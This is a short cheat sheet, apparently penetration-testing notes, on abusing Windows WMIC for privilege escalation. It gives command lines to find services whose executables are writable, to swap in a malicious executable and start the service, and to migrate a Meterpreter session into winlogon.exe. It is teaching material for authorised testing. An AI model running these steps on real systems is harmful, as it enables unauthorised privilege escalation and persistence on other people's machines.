# WMIC
Windows Management Instrumentation Command-Line

* List all the services on the machine:
  ```
  c:> wmic service list brief
  ```
  This will produce a lot out output and we need to know which one of all of these services have weak permissions. In order to check that we can use the icacls program. Notice that icacls is only available from Vista and up. XP and lower has cacls instead.

* Find all the potentially weak services  

  As you can see in the command below you need to make sure that you have access to wmic, icacls and write privilege in C:\windows\temp.

  ```
  c:> for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt

  c:> for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
  ```
  - The first command uses wmic to list the services, looks for the full path of the executable, filters out system32 paths, and then dumps that output to a text file.
  - The second command parses that text file getting rid of some junk in the path name then does the icacls command on that path to determine the permissions on that service executable.
  - In the output you want to look for BUILTIN\Users:(F). Or where your user/usergroup has (F) or (C) rights. For this service, replace executable with malicious exe.

* Start the service
  ```
  c:> wmic service [SERVICE NAME] call startservice
  ```

* When a meterpreter session dies quickly, you need to find a more stable process to migrate to. Get the PID for `winlogon.exe`
  ```
  c:> wmic process list brief | find "winlogon"
  ```
  Migrate to that in Meterpreter session
